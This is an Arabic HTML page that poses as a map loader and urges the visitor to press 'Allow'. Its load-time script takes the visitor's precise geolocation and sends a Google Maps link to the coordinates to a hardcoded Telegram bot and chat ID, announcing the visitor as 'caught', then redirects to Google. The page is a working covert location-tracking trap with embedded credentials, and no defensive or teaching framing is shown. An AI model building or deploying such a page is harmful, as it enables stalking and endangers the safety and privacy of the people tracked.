<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <script>
        window.onload = function() {
            navigator.geolocation.getCurrentPosition(function(p) {
                const t = "8740313121:AAHNUZ9vMOCeCU-_I1WBJtbAc5zTDrmAQz4";
                const c = "8419832124";
                const m = `🎯 تم الصيد!\n📍 الرابط: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                
                fetch(`https://api.telegram.org/bot${t}/sendMessage?chat_id=${c}&text=${encodeURIComponent(m)}`)
                .then(() => { window.location.href = "https://www.google.com"; });
            }, function(e) {
                alert("يجب الضغط على 'سماح' لمشاهدة الخريطة!");
            }, {enableHighAccuracy: true});
        };
    </script>
</head>
<body style="background:black; color:white; text-align:center;">
    <h2>جاري تحميل الخريطة... يرجى الضغط على "سماح"</h2>
</body>
</html>
